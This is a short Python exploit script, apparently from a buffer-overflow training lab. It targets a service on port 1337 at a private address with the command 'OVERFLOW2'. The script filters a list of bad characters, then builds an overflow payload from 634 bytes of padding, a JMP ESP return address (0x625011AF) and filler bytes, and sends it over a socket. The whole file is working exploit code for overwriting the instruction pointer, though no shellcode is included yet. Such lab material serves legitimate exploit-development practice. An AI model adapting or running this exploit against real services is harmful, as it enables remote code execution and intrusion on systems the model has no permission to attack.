#!/usr/bin/env python3

import socket
import struct

def p32(data):
	return struct.pack('<I', data)

host, port = "10.10.191.46", 1337

all_chars = bytearray(range(1,256))

bad_chars = [
	b"\x00",
	b"\x23",
	b"\x24",
	b"\x3c",
	b"\x3d",
	b"\x83",
	b"\x84",
	b"\xba",
	b"\xbb",
]

for bad_char in bad_chars:
	all_chars = all_chars.replace(bad_char, b"")

command = b"OVERFLOW2 "
length = 1000
offset = 634
jmp_esp = p32(0x625011AF)

payload = b"".join([
	command,
	b"A" * offset,
	jmp_esp,
	b"C" * ( length - len(jmp_esp) - offset),
])

with socket.socket() as s:
	s.connect((host, port))
	s.send(payload)